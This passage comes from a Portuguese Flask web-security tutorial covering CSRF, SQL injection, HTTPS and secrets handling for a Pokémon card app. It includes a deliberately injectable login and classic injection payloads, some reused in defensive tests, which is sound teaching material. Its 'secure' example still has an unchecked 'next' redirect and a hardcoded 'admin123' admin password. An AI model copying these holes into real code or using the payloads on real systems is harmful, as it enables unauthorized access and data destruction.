    return jsonify({'total_usuarios': 1000})
```

> ⚠️ **Cuidado**: Só isente rotas que **realmente** não precisam de proteção CSRF (geralmente APIs públicas de leitura).

#### Tratamento de Erros CSRF

```python
# app.py
@app.errorhandler(400)
def handle_csrf_error(e):
    """Tratamento customizado para erros CSRF."""
    if 'CSRF' in str(e):
        flash('Token de segurança inválido. Por favor, tente novamente.', 'danger')
        return redirect(request.referrer or url_for('index'))
    return e
```

### 📊 Comparação: Com e Sem CSRF

| Aspecto | Sem Proteção CSRF | Com Flask-WTF |
|---------|-------------------|---------------|
| **Formulários** | Vulneráveis | Protegidos automaticamente |
| **AJAX** | Vulneráveis | Protegidos com header |
| **Configuração** | Nada | 2 linhas de código |
| **Performance** | Não aplicável | Impacto mínimo |
| **Segurança** | ❌ Vulnerável | ✅ Protegido |

### 🎯 Exemplo Completo: Aplicando CSRF no PokéBooster

```python
# app.py
from flask import Flask, render_template, request, session, jsonify, redirect, url_for, flash
from flask_sqlalchemy import SQLAlchemy
from flask_bcrypt import Bcrypt
from flask_wtf.csrf import CSRFProtect
import random

app = Flask(__name__)
app.config['SECRET_KEY'] = 'chave-super-secreta-forte'
app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql://...'

db = SQLAlchemy(app)
bcrypt = Bcrypt(app)
csrf = CSRFProtect(app)  # <- Ativa CSRF

# ... (modelos Usuario, Carta) ...

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        # Token CSRF verificado automaticamente!
        username = request.form['username']
        senha = request.form['senha']
        # ... (resto da lógica de login) ...
    return render_template('login.html')

@app.route('/abrir_pacote', methods=['POST'])
@login_required
def abrir_pacote():
    # Token CSRF verificado automaticamente!
    cartas = random.sample(LISTA_GLOBAL_POKEMON, 4)
    return jsonify({'cartas': cartas})

@app.route('/api/migrar_para_nuvem', methods=['POST'])
@login_required
def migrar_para_nuvem():
    # Token CSRF verificado automaticamente!
    colecao = request.json
    # ... (lógica de migração) ...
    return jsonify({'sucesso': True})

if __name__ == '__main__':
    app.run(debug=True)
```

```html
<!-- templates/login.html -->
{% extends 'base.html' %}

{% block content %}
<form method="POST">
    {{ csrf_token() }}  <!-- Token CSRF -->
    
    <input type="text" name="username" required>
    <input type="password" name="senha" required>
    <button type="submit">Login</button>
</form>
{% endblock %}
```

```javascript
// static/app.js
function getCSRFToken() {
    return document.querySelector('meta[name="csrf-token"]').content;
}

// Todas as requisições POST/PUT/DELETE devem incluir o token
fetch('/abrir_pacote', {
    method: 'POST',
    headers: {
        'X-CSRFToken': getCSRFToken()
    }
});
```

### ✅ Checklist de Proteção CSRF

- [ ] Flask-WTF instalado e configurado
- [ ] `{{ csrf_token() }}` em todos os formulários
- [ ] Meta tag CSRF no `base.html`
- [ ] Token incluído em requisições AJAX
- [ ] Rotas sensíveis usam POST/PUT/DELETE (não GET)
- [ ] Tratamento de erro CSRF implementado
- [ ] Testes verificam proteção CSRF

---

## 6.6 SQL Injection: Por que ORM nos protege

### ⚠️ O que é SQL Injection?

**SQL Injection** é uma vulnerabilidade onde um atacante insere código SQL malicioso através de inputs do usuário, manipulando consultas ao banco de dados.

### 💣 Exemplo de Código EXTREMAMENTE VULNERÁVEL

```python
# ❌ NUNCA, JAMAIS FAÇA ISSO!
@app.route('/login', methods=['POST'])
def login_inseguro():
    username = request.form['username']
    senha = request.form['senha']
    
    # Construindo query SQL com concatenação de strings - PERIGOSO!
    query = f"SELECT * FROM usuario WHERE username = '{username}' AND senha = '{senha}'"
    
    result = db.engine.execute(query)
    usuario = result.fetchone()
    
    if usuario:
        return "Login bem-sucedido!"
    return "Credenciais inválidas"
```

### 💥 Como o Ataque Funciona

**Input malicioso do atacante:**
```
username: admin' --
senha: qualquercoisa
```

**Query SQL resultante:**
```sql
SELECT * FROM usuario 
WHERE username = 'admin' --' AND senha = 'qualquercoisa'
```

O `--` é um comentário em SQL, então a verificação de senha é **ignorada**!

**Query executada de verdade:**
```sql
SELECT * FROM usuario WHERE username = 'admin'
```

🎭 **O atacante consegue fazer login como admin sem saber a senha!**

### 🔓 Ataques Mais Perigosos

#### 1. Deletar Todos os Usuários

```python
# Input malicioso:
username: admin'; DROP TABLE usuario; --
senha: qualquercoisa

# Query executada:
SELECT * FROM usuario WHERE username = 'admin'; 
DROP TABLE usuario; 
--' AND senha = 'qualquercoisa'
```

💀 **Toda a tabela de usuários é deletada!**

#### 2. Roubar Todos os Dados

```python
# Input malicioso:
username: ' OR '1'='1
senha: ' OR '1'='1

# Query executada:
SELECT * FROM usuario 
WHERE username = '' OR '1'='1' 
AND senha = '' OR '1'='1'
```

Como `'1'='1'` é sempre verdadeiro, a query retorna **todos** os usuários!

### 🛡️ Como o SQLAlchemy (ORM) Protege

O **SQLAlchemy** usa **prepared statements** (declarações preparadas) que separam o código SQL dos dados:

```python
# ✅ SEGURO - SQLAlchemy usa prepared statements
@app.route('/login', methods=['POST'])
def login_seguro():
    username = request.form['username']
    senha = request.form['senha']
    
    # SQLAlchemy trata username como DADO, não como CÓDIGO
    usuario = Usuario.query.filter_by(username=username).first()
    
    if usuario and usuario.check_senha(senha):
        return "Login bem-sucedido!"
    return "Credenciais inválidas"
```

**Como funciona por baixo dos panos:**

```sql
-- SQLAlchemy gera:
SELECT * FROM usuario WHERE username = ?

-- E passa o valor separadamente:
parametros = ['admin\' --']

-- O banco de dados trata tudo como uma STRING LITERAL,
-- não como código SQL
```

### 📊 Comparação: Código Vulnerável vs Seguro

| Aspecto | SQL Concatenado (Inseguro) | SQLAlchemy ORM (Seguro) |
|---------|---------------------------|------------------------|
| **Sintaxe** | `f"SELECT * WHERE id={id}"` | `Usuario.query.get(id)` |
| **Proteção** | ❌ Nenhuma | ✅ Automática |
| **Legibilidade** | Difícil | Pythônico |
| **Portabilidade** | Específico do DB | Funciona em MySQL, PostgreSQL, etc. |
| **Risco** | Altíssimo | Muito baixo |

### 💻 Exemplos Práticos: SQLAlchemy Seguro

#### Buscar Usuário

```python
# ✅ SEGURO
@app.route('/perfil/<username>')
def perfil(username):
    usuario = Usuario.query.filter_by(username=username).first()
    
    if not usuario:
        return "Usuário não encontrado", 404
    
    return render_template('perfil.html', usuario=usuario)
```

#### Buscar com Múltiplos Filtros

```python
# ✅ SEGURO
@app.route('/buscar_cartas')
def buscar_cartas():
    pokemon_id = request.args.get('id', type=int)
    user_id = session.get('user_id')
    
    cartas = Carta.query.filter_by(
        pokemon_id=pokemon_id,
        user_id=user_id
    ).all()
    
    return render_template('cartas.html', cartas=cartas)
```

#### Buscar com LIKE

```python
# ✅ SEGURO
@app.route('/buscar')
def buscar():
    termo = request.args.get('q', '')
    
    # SQLAlchemy escapa automaticamente o termo
    usuarios = Usuario.query.filter(
        Usuario.username.like(f'%{termo}%')
    ).all()
    
    return render_template('resultados.html', usuarios=usuarios)
```

### ⚠️ Quando Usar SQL Bruto (Com Cuidado)

Às vezes, você precisa de queries complexas que o ORM não suporta bem. Nestes casos, use **prepared statements**:

```python
# ✅ SEGURO - Usando prepared statements
from sqlalchemy import text

@app.route('/relatorio_complexo')
def relatorio():
    data_inicio = request.args.get('inicio')
    data_fim = request.args.get('fim')
    
    # Usando parâmetros nomeados (:parametro)
    query = text("""
        SELECT u.username, COUNT(c.id) as total_cartas
        FROM usuario u
        LEFT JOIN carta c ON u.id = c.user_id
        WHERE u.criado_em BETWEEN :inicio AND :fim
        GROUP BY u.id
        ORDER BY total_cartas DESC
    """)
    
    # Passa os parâmetros separadamente
    result = db.session.execute(
        query,
        {"inicio": data_inicio, "fim": data_fim}
    )
    
    dados = result.fetchall()
    return render_template('relatorio.html', dados=dados)
```

**❌ Nunca faça:**
```python
# PERIGOSO!
query = f"SELECT * FROM usuario WHERE criado_em > '{data_inicio}'"
```

**✅ Sempre faça:**
```python
# SEGURO
query = text("SELECT * FROM usuario WHERE criado_em > :inicio")
result = db.session.execute(query, {"inicio": data_inicio})
```

### 🎯 Técnicas Defensivas Adicionais

#### 1. Validação de Tipos

```python
@app.route('/usuario/<int:user_id>')  # <- Força a ser int
def ver_usuario(user_id):
    # Se user_id não for int, Flask retorna 404 automaticamente
    usuario = Usuario.query.get_or_404(user_id)
    return render_template('usuario.html', usuario=usuario)
```

#### 2. Whitelist de Colunas para Ordenação

```python
@app.route('/usuarios')
def listar_usuarios():
    ordem = request.args.get('ordem', 'username')
    
    # Whitelist de colunas permitidas
    colunas_permitidas = {
        'username': Usuario.username,
        'criado_em': Usuario.criado_em
    }
    
    # Usa a coluna apenas se estiver na whitelist
    coluna_ordem = colunas_permitidas.get(ordem, Usuario.username)
    
    usuarios = Usuario.query.order_by(coluna_ordem).all()
    return render_template('usuarios.html', usuarios=usuarios)
```

#### 3. Limite de Resultados

```python
@app.route('/buscar')
def buscar():
    termo = request.args.get('q', '')
    
    # Limita a quantidade de resultados
    usuarios = Usuario.query.filter(
        Usuario.username.like(f'%{termo}%')
    ).limit(100).all()  # <- No máximo 100 resultados
    
    return render_template('resultados.html', usuarios=usuarios)
```

### 🔍 Testando Proteção Contra SQL Injection

```python
# tests/test_seguranca.py
def test_sql_injection_login(client):
    """Testa se a aplicação é vulnerável a SQL injection no login."""
    
    # Tenta SQL injection clássico
    response = client.post('/login', data={
        'username': "admin' OR '1'='1",
        'senha': "qualquercoisa"
    })
    
    # Deve falhar o login
    assert response.status_code == 401
    assert b'Credenciais inv' in response.data

def test_sql_injection_busca(client):
    """Testa SQL injection em campo de busca."""
    
    response = client.get('/buscar?q=' + quote("'; DROP TABLE usuario; --"))
    
    # Não deve causar erro
    assert response.status_code == 200
    
    # Verifica que a tabela ainda existe
    usuario_count = Usuario.query.count()
    assert usuario_count >= 0  # Tabela não foi deletada
```

### ✅ Checklist de Proteção SQL Injection

- [ ] Usar SQLAlchemy ORM para todas as queries
- [ ] Nunca concatenar strings para criar SQL
- [ ] Usar `text()` com parâmetros para SQL bruto
- [ ] Validar tipos de dados (int, string, etc.)
- [ ] Implementar whitelist para colunas dinâmicas
- [ ] Limitar número de resultados
- [ ] Testar inputs maliciosos
- [ ] Usar `.get_or_404()` para buscas por ID
- [ ] Implementar rate limiting em buscas

---

## 6.7 HTTPS e Variáveis de Ambiente: Protegendo Dados Sensíveis

### 🔒 Por que HTTPS é Essencial

**HTTPS** (HTTP Secure) é a versão criptografada do HTTP. Ele protege contra:

#### 1. Man-in-the-Middle (MitM) Attacks

```
Sem HTTPS (HTTP):
┌──────┐  senha123  ┌────────┐  senha123  ┌──────────┐
│Cliente├───────────>│Atacante├───────────>│ Servidor │
└──────┘            └────────┘            └──────────┘
         Dados em texto plano (interceptável)

Com HTTPS:
┌──────┐ ********* ┌────────┐ ********* ┌──────────┐
│Cliente├──────────>│Atacante├──────────>│ Servidor │
└──────┘           └────────┘           └──────────┘
         Dados criptografados (ilegível)
```

#### 2. Roubo de Credenciais

Sem HTTPS, qualquer pessoa na mesma rede Wi-Fi pode capturar:
- 🔑 Senhas
- 🍪 Cookies de sessão
- 💳 Números de cartão de crédito
- 📧 E-mails e mensagens

#### 3. Modificação de Dados

Atacantes podem modificar:
- Injetar scripts maliciosos
- Alterar números em transações
- Modificar conteúdo de páginas

### 📊 HTTP vs HTTPS

| Aspecto | HTTP | HTTPS |
|---------|------|-------|
| **Porta** | 80 | 443 |
| **Criptografia** | ❌ Nenhuma | ✅ TLS/SSL |
| **Certificado** | Não necessário | Obrigatório |
| **SEO** | Penalizado | Favorecido |
| **Navegadores** | Sinal de "Não Seguro" | Cadeado verde |
| **Performance** | Ligeiramente mais rápido | Aceitável (HTTP/2) |

### 🔐 Forçando HTTPS no Flask

```python
# app.py
from flask import Flask, redirect, request

app = Flask(__name__)

@app.before_request
def force_https():
    """Redireciona HTTP para HTTPS."""
    if not request.is_secure and not app.debug:
        url = request.url.replace('http://', 'https://', 1)
        return redirect(url, code=301)
```

### 📦 Usando Flask-Talisman

```bash
pip install flask-talisman
```

```python
# app.py
from flask import Flask
from flask_talisman import Talisman

app = Flask(__name__)

# Força HTTPS e adiciona headers de segurança
Talisman(app, 
    force_https=True,
    strict_transport_security=True,
    strict_transport_security_max_age=31536000,  # 1 ano
    content_security_policy={
        'default-src': "'self'",
        'script-src': "'self' https://cdn.jsdelivr.net",
        'style-src': "'self' https://cdn.jsdelivr.net"
    }
)
```

### 🌐 Obtendo Certificado SSL Gratuito

**Let's Encrypt** oferece certificados SSL gratuitos:

```bash
# Instalar Certbot
sudo apt-get install certbot python3-certbot-nginx

# Obter certificado
sudo certbot --nginx -d seudominio.com -d www.seudominio.com

# Renovação automática (adicionar ao crontab)
0 0 * * * certbot renew --quiet
```

---

### 🔐 Variáveis de Ambiente: Protegendo Dados Sensíveis

### ⚠️ O Problema

```python
# ❌ NUNCA faça isso no código!
app.config['SECRET_KEY'] = 'minha-chave-123'
app.config['DATABASE_URI'] = 'mysql://root:senha123@localhost/db'
app.config['API_KEY'] = 'sk-abcdefghijklmnop'
```

**Por que isso é terrível?**
- 🔓 Credenciais expostas no código-fonte
- 📤 Vazamento no Git/GitHub
- 🔄 Difícil mudar em diferentes ambientes
- 👀 Qualquer pessoa com acesso ao código vê as senhas

### ✅ A Solução: Variáveis de Ambiente

**Variáveis de ambiente** são valores armazenados no sistema operacional, não no código:

```bash
# Linux/Mac
export SECRET_KEY="chave-super-secreta"
export DATABASE_URL="mysql://..."

# Windows
set SECRET_KEY=chave-super-secreta
set DATABASE_URL=mysql://...
```

### 📦 Usando python-dotenv

```bash
pip install python-dotenv
```

#### Passo 1: Criar arquivo `.env`

```bash
# .env (na raiz do projeto)
SECRET_KEY=chave-super-secreta-gerada-aleatoriamente
DATABASE_URL=mysql://usuario:senha@localhost/pokebooster
FLASK_ENV=development
DEBUG=True

# APIs externas
POKEAPI_BASE_URL=https://pokeapi.co/api/v2

# Email
MAIL_SERVER=smtp.gmail.com
MAIL_PORT=587
MAIL_USERNAME=seu_email@gmail.com
MAIL_PASSWORD=sua_senha_app
```

#### Passo 2: Adicionar `.env` ao `.gitignore`

```bash
# .gitignore
.env
*.pyc
__pycache__/
venv/
.DS_Store
```

⚠️ **CRÍTICO**: Nunca commitar o arquivo `.env` no Git!

#### Passo 3: Carregar no app.py

```python
# app.py
from flask import Flask
import os
from dotenv import load_dotenv

# Carrega variáveis do arquivo .env
load_dotenv()

app = Flask(__name__)

# Usa as variáveis de ambiente
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY')
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv('DATABASE_URL')
app.config['DEBUG'] = os.getenv('DEBUG', 'False') == 'True'

# Com valor padrão (fallback)
POKEAPI_URL = os.getenv('POKEAPI_BASE_URL', 'https://pokeapi.co/api/v2')
```

### 🎯 Exemplo Completo: Configuração Segura

```python
# config.py
import os
from dotenv import load_dotenv

load_dotenv()

class Config:
    """Configuração base."""
    SECRET_KEY = os.getenv('SECRET_KEY') or 'chave-de-desenvolvimento'
    SQLALCHEMY_TRACK_MODIFICATIONS = False
    
    # Segurança de sessão
    SESSION_COOKIE_SECURE = True
    SESSION_COOKIE_HTTPONLY = True
    SESSION_COOKIE_SAMESITE = 'Lax'
    PERMANENT_SESSION_LIFETIME = 3600  # 1 hora

class DevelopmentConfig(Config):
    """Configuração de desenvolvimento."""
    DEBUG = True
    SQLALCHEMY_DATABASE_URI = os.getenv('DEV_DATABASE_URL')
    SESSION_COOKIE_SECURE = False  # HTTP ok em dev

class ProductionConfig(Config):
    """Configuração de produção."""
    DEBUG = False
    SQLALCHEMY_DATABASE_URI = os.getenv('DATABASE_URL')
    
    # Configurações de email (produção)
    MAIL_SERVER = os.getenv('MAIL_SERVER')
    MAIL_PORT = int(os.getenv('MAIL_PORT', 587))
    MAIL_USE_TLS = True
    MAIL_USERNAME = os.getenv('MAIL_USERNAME')
    MAIL_PASSWORD = os.getenv('MAIL_PASSWORD')

class TestingConfig(Config):
    """Configuração de testes."""
    TESTING = True
    SQLALCHEMY_DATABASE_URI = 'sqlite:///:memory:'
    WTF_CSRF_ENABLED = False

# Dicionário de configurações
config = {
    'development': DevelopmentConfig,
    'production': ProductionConfig,
    'testing': TestingConfig,
    'default': DevelopmentConfig
}
```

```python
# app.py
from flask import Flask
from config import config
import os

def create_app():
    app = Flask(__name__)
    
    # Carrega configuração baseada em FLASK_ENV
    env = os.getenv('FLASK_ENV', 'development')
    app.config.from_object(config[env])
    
    # Inicializa extensões
    db.init_app(app)
    bcrypt.init_app(app)
    csrf.init_app(app)
    
    return app

app = create_app()
```

### 🔑 Gerando Chaves Secretas Seguras

```python
# gerar_secret_key.py
import secrets

def gerar_secret_key(tamanho=32):
    """
    Gera uma chave secreta criptograficamente segura.
    
    Args:
        tamanho (int): Tamanho da chave em bytes
        
    Returns:
        str: Chave em formato hexadecimal
    """
    return secrets.token_hex(tamanho)

if __name__ == '__main__':
    print("SECRET_KEY gerada:")
    print(gerar_secret_key())
```

```bash
# Executar
python gerar_secret_key.py

# Saída:
# SECRET_KEY gerada:
# 8f4a9c2b7d1e6f3a8c9b2d4e7f1a3c5b9e2f4a7c1d3e5f7a9c2b4d6e8f1a3c5b
```

### 📋 Exemplo de .env.example

Crie um arquivo `.env.example` (este SIM deve ser commitado):

```bash
# .env.example
# Copie este arquivo para .env e preencha os valores reais

# Flask
SECRET_KEY=sua_secret_key_aqui
FLASK_ENV=development
DEBUG=True

# Database
DATABASE_URL=mysql://usuario:senha@localhost/nome_do_banco

# PokeAPI
POKEAPI_BASE_URL=https://pokeapi.co/api/v2

# Email (opcional em dev)
MAIL_SERVER=smtp.gmail.com
MAIL_PORT=587
MAIL_USERNAME=seu_email@gmail.com
MAIL_PASSWORD=sua_senha_app
```

Instruções no README:
```markdown
## Configuração

1. Copie o arquivo de exemplo:
   ```bash
   cp .env.example .env
   ```

2. Edite `.env` com suas configurações reais

3. **Nunca** commite o arquivo `.env`!
```

### ✅ Checklist de Segurança de Configuração

- [ ] Usar HTTPS em produção
- [ ] Forçar redirecionamento HTTP → HTTPS
- [ ] Certificado SSL válido e atualizado
- [ ] Todas as credenciais em variáveis de ambiente
- [ ] `.env` adicionado ao `.gitignore`
- [ ] `.env.example` documentado no repositório
- [ ] SECRET_KEY gerada com `secrets.token_hex()`
- [ ] Configurações diferentes para dev/prod/test
- [ ] Headers de segurança implementados (CSP, HSTS, etc.)
- [ ] Renovação automática de certificado SSL

---

## 6.8 Projeto: Implementando Login Seguro no PokéBooster

Vamos consolidar tudo o que aprendemos implementando um sistema de login completo e seguro no PokéBooster.

### 📁 Estrutura do Projeto

```
poke_tcg/
├── venv/
├── app.py
├── config.py
├── requirements.txt
├── .env
├── .env.example
├── .gitignore
├── static/
│   ├── style.css
│   └── app.js
└── templates/
    ├── base.html
    ├── index.html
    ├── login.html
    ├── registro.html
    └── perfil.html
```

### 📦 requirements.txt

```txt
Flask==3.0.0
Flask-SQLAlchemy==3.1.1
Flask-Bcrypt==1.0.1
Flask-WTF==1.2.1
mysqlclient==2.2.0
python-dotenv==1.0.0
requests==2.31.0
```

### 🔧 config.py

```python
# config.py
import os
from dotenv import load_dotenv
from datetime import timedelta

load_dotenv()

class Config:
    """Configuração base com valores comuns."""
    
    # Chaves secretas
    SECRET_KEY = os.getenv('SECRET_KEY', 'chave-de-desenvolvimento')
    
    # Banco de dados
    SQLALCHEMY_TRACK_MODIFICATIONS = False
    
    # Sessão
    SESSION_COOKIE_SECURE = True  # Apenas HTTPS
    SESSION_COOKIE_HTTPONLY = True  # Não acessível via JS
    SESSION_COOKIE_SAMESITE = 'Lax'  # Proteção CSRF
    PERMANENT_SESSION_LIFETIME = timedelta(hours=1)
    
    # WTF (CSRF)
    WTF_CSRF_ENABLED = True
    WTF_CSRF_TIME_LIMIT = None  # Token não expira
    
    # PokeAPI
    POKEAPI_URL = os.getenv('POKEAPI_URL', 'https://pokeapi.co/api/v2')

class DevelopmentConfig(Config):
    """Configuração de desenvolvimento."""
    DEBUG = True
    SQLALCHEMY_DATABASE_URI = os.getenv('DEV_DATABASE_URL')
    SQLALCHEMY_ECHO = True  # Log de queries SQL
    SESSION_COOKIE_SECURE = False  # HTTP ok em dev

class ProductionConfig(Config):
    """Configuração de produção."""
    DEBUG = False
    TESTING = False
    SQLALCHEMY_DATABASE_URI = os.getenv('DATABASE_URL')
    
    # Logs
    LOG_TO_STDOUT = os.getenv('LOG_TO_STDOUT', 'False') == 'True'

class TestingConfig(Config):
    """Configuração de testes."""
    TESTING = True
    SQLALCHEMY_DATABASE_URI = 'sqlite:///:memory:'
    WTF_CSRF_ENABLED = False
    SESSION_COOKIE_SECURE = False

config = {
    'development': DevelopmentConfig,
    'production': ProductionConfig,
    'testing': TestingConfig,
    'default': DevelopmentConfig
}
```

### 🗄️ app.py (Completo)

```python
# app.py
from flask import Flask, render_template, request, redirect, url_for, session, jsonify, flash
from flask_sqlalchemy import SQLAlchemy
from flask_bcrypt import Bcrypt
from flask_wtf.csrf import CSRFProtect
from functools import wraps
from datetime import datetime
import requests
import random
import os

from config import config

# Inicialização de extensões
db = SQLAlchemy()
bcrypt = Bcrypt()
csrf = CSRFProtect()

def create_app():
    """Factory pattern para criar a aplicação."""
    app = Flask(__name__)
    
    # Carrega configuração
    env = os.getenv('FLASK_ENV', 'development')
    app.config.from_object(config[env])
    
    # Inicializa extensões
    db.init_app(app)
    bcrypt.init_app(app)
    csrf.init_app(app)
    
    # Headers de segurança
    @app.after_request
    def set_security_headers(response):
        response.headers['Content-Security-Policy'] = (
            "default-src 'self'; "
            "script-src 'self' https://cdn.jsdelivr.net; "
            "style-src 'self' https://cdn.jsdelivr.net; "
            "img-src 'self' https://raw.githubusercontent.com data:;"
        )
        response.headers['X-Content-Type-Options'] = 'nosniff'
        response.headers['X-Frame-Options'] = 'DENY'
        response.headers['X-XSS-Protection'] = '1; mode=block'
        return response
    
    return app

app = create_app()

# ==========================================
# MODELOS
# ==========================================

class Usuario(db.Model):
    """Modelo de usuário com autenticação segura."""
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False, index=True)
    email = db.Column(db.String(120), unique=True, nullable=False)
    senha_hash = db.Column(db.String(128), nullable=False)
    criado_em = db.Column(db.DateTime, default=datetime.utcnow)
    
    # Relacionamentos
    cartas = db.relationship('Carta', backref='dono', lazy=True, cascade='all, delete-orphan')
    
    def set_senha(self, senha):
        """Cria hash bcrypt da senha."""
        self.senha_hash = bcrypt.generate_password_hash(senha).decode('utf-8')
    
    def check_senha(self, senha):
        """Verifica se a senha está correta."""
        return bcrypt.check_password_hash(self.senha_hash, senha)
    
    def __repr__(self):
        return f'<Usuario {self.username}>'

class Carta(db.Model):
    """Modelo de carta capturada."""
    id = db.Column(db.Integer, primary_key=True)
    pokemon_id = db.Column(db.Integer, nullable=False)
    nome = db.Column(db.String(100), nullable=False)
    user_id = db.Column(db.Integer, db.ForeignKey('usuario.id'), nullable=False)
    capturado_em = db.Column(db.DateTime, default=datetime.utcnow)
    
    def __repr__(self):
        return f'<Carta {self.nome} (User {self.user_id})>'

# ==========================================
# DECORADORES
# ==========================================

def login_required(f):
    """Requer que o usuário esteja autenticado."""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            flash('Você precisa fazer login para acessar esta página.', 'warning')
            return redirect(url_for('login', next=request.url))
        return f(*args, **kwargs)
    return decorated_function

# ==========================================
# FUNÇÕES AUXILIARES
# ==========================================

def carregar_dados_pokemon():
    """Busca lista de 151 Pokémon da PokeAPI."""
    try:
        url = f"{app.config['POKEAPI_URL']}/pokemon?limit=151"
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        
        data = response.json()
        lista_pokemon = []
        
        for i, poke in enumerate(data['results']):
            lista_pokemon.append({
                'id': i + 1,
                'nome': poke['name'].title()
            })
        
        return lista_pokemon
    except requests.RequestException as e:
        app.logger.error(f"Erro ao buscar Pokémon: {e}")
        return []

# Carrega lista na inicialização
LISTA_GLOBAL_POKEMON = carregar_dados_pokemon()

# ==========================================
# ROTAS DE AUTENTICAÇÃO
# ==========================================

@app.route('/registro', methods=['GET', 'POST'])
def registro():
    """Registro de novo usuário."""
    if 'user_id' in session:
        return redirect(url_for('index'))
    
    if request.method == 'POST':
        username = request.form['username'].strip()
        email = request.form['email'].strip().lower()
        senha = request.form['senha']
        
        # Validações
        if len(username) < 3:
            flash('Nome de usuário deve ter no mínimo 3 caracteres.', 'warning')
            return redirect(url_for('registro'))
        
        if len(senha) < 8:
            flash('Senha deve ter no mínimo 8 caracteres.', 'warning')
            return redirect(url_for('registro'))
        
        # Verifica se já existe
        if Usuario.query.filter_by(username=username).first():
            flash('Nome de usuário já existe.', 'warning')
            return redirect(url_for('registro'))
        
        if Usuario.query.filter_by(email=email).first():
            flash('E-mail já cadastrado.', 'warning')
            return redirect(url_for('registro'))
        
        # Cria usuário
        novo_usuario = Usuario(username=username, email=email)
        novo_usuario.set_senha(senha)
        
        try:
            db.session.add(novo_usuario)
            db.session.commit()
            flash('Conta criada com sucesso! Faça login.', 'success')
            return redirect(url_for('login'))
        except Exception as e:
            db.session.rollback()
            app.logger.error(f"Erro ao criar usuário: {e}")
            flash('Erro ao criar conta. Tente novamente.', 'danger')
    
    return render_template('registro.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Login de usuário."""
    if 'user_id' in session:
        return redirect(url_for('index'))
    
    if request.method == 'POST':
        username = request.form['username'].strip()
        senha = request.form['senha']
        
        # Busca usuário
        usuario = Usuario.query.filter_by(username=username).first()
        
        # Verifica credenciais
        if usuario and usuario.check_senha(senha):
            # Login bem-sucedido
            session.clear()  # Limpa qualquer sessão anterior
            session['user_id'] = usuario.id
            session['username'] = usuario.username
            session.permanent = True  # Usa PERMANENT_SESSION_LIFETIME
            
            flash(f'Bem-vindo de volta, {usuario.username}!', 'success')
            
            # Redireciona para página original
            next_page = request.args.get('next')
            return redirect(next_page or url_for('index'))
        
        # Credenciais inválidas (mensagem genérica)
        flash('Usuário ou senha inválidos.', 'danger')
    
    return render_template('login.html')

@app.route('/logout')
def logout():
    """Logout de usuário."""
    username = session.get('username', 'Usuário')
    session.clear()
    flash(f'Até logo, {username}!', 'info')
    return redirect(url_for('index'))

# ==========================================
# ROTAS PRINCIPAIS
# ==========================================

@app.route('/')
def index():
    """Página inicial com galeria de Pokémon."""
    return render_template('index.html')

@app.route('/api/pokemon')
def api_pokemon():
    """API: Retorna lista de 151 Pokémon."""
    if not LISTA_GLOBAL_POKEMON:
        return jsonify({'erro': 'Falha ao carregar dados'}), 500
    return jsonify(LISTA_GLOBAL_POKEMON)

@app.route('/abrir_pacote', methods=['POST'])
@login_required
def abrir_pacote():
    """Sorteia 4 cartas aleatórias."""
    try:
        if not LISTA_GLOBAL_POKEMON:
            return jsonify({'erro': 'Dados não disponíveis'}), 500
        
        # Sorteia 4 cartas únicas
        cartas_sorteadas = random.sample(LISTA_GLOBAL_POKEMON, 4)
        
        return jsonify({'cartas': cartas_sorteadas})
    except Exception as e:
        app.logger.error(f"Erro ao abrir pacote: {e}")
        return jsonify({'erro': 'Erro ao processar requisição'}), 500

@app.route('/api/migrar_para_nuvem', methods=['POST'])
@login_required
def migrar_para_nuvem():
    """Migra coleção do Local Storage para o banco."""
    try:
        user_id = session['user_id']
        colecao_local = request.json
        
        if not colecao_local:
            return jsonify({'erro': 'Nenhum dado recebido'}), 400
        
        # Mapa de nomes
        mapa_nomes = {p['id']: p['nome'] for p in LISTA_GLOBAL_POKEMON}
        
        novas_cartas = 0
        
        for poke_id_str in colecao_local.keys():
            poke_id = int(poke_id_str)
            
            # Verifica se já existe
            carta_existente = Carta.query.filter_by(
                user_id=user_id,
                pokemon_id=poke_id
            ).first()
            
            if not carta_existente:
                nova_carta = Carta(
                    pokemon_id=poke_id,
                    nome=mapa_nomes.get(poke_id, 'Desconhecido'),
                    user_id=user_id
                )
                db.session.add(nova_carta)
                novas_cartas += 1
        
        db.session.commit()
        
        return jsonify({
            'sucesso': True,
            'mensagem': f'{novas_cartas} nova(s) carta(s) salva(s)!'
        })
    
    except Exception as e:
        db.session.rollback()
        app.logger.error(f"Erro na migração: {e}")
        return jsonify({'erro': 'Erro ao salvar dados'}), 500

@app.route('/perfil')
@login_required
def perfil():
    """Perfil do usuário com suas cartas."""
    user_id = session['user_id']
    usuario = Usuario.query.get_or_404(user_id)
    
    # Cartas do usuário
    cartas = Carta.query.filter_by(user_id=user_id).order_by(Carta.capturado_em.desc()).all()
    
    return render_template('perfil.html', usuario=usuario, cartas=cartas)

# ==========================================
# TRATAMENTO DE ERROS
# ==========================================

@app.errorhandler(404)
def not_found(e):
    """Página não encontrada."""
    return render_template('404.html'), 404

@app.errorhandler(403)
def forbidden(e):
    """Acesso negado."""
    return render_template('403.html'), 403

@app.errorhandler(500)
def internal_error(e):
    """Erro interno do servidor."""
    db.session.rollback()
    app.logger.error(f"Erro 500: {e}")
    return render_template('500.html'), 500

# ==========================================
# COMANDOS CLI
# ==========================================

@app.cli.command()
def init_db():
    """Cria as tabelas do banco de dados."""
    db.create_all()
    print("✅ Banco de dados criado com sucesso!")

@app.cli.command()
def create_admin():
    """Cria um usuário administrador."""
    admin = Usuario(
        username='admin',
        email='admin@pokebooster.com'
    )
    admin.set_senha('admin123')
    
    db.session.add(admin)
    db.session.commit()
    print("✅ Usuário admin criado!")

# ==========================================
# EXECUÇÃO
# ==========================================

if __name__ == '__main__':
    app.run(debug=True)
```

### 📝 templates/base.html

```html
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- CSRF Token para AJAX -->
    <meta name="csrf-token" content="{{ csrf_token() }}">
    
    <!-- Bootstrap CSS -->
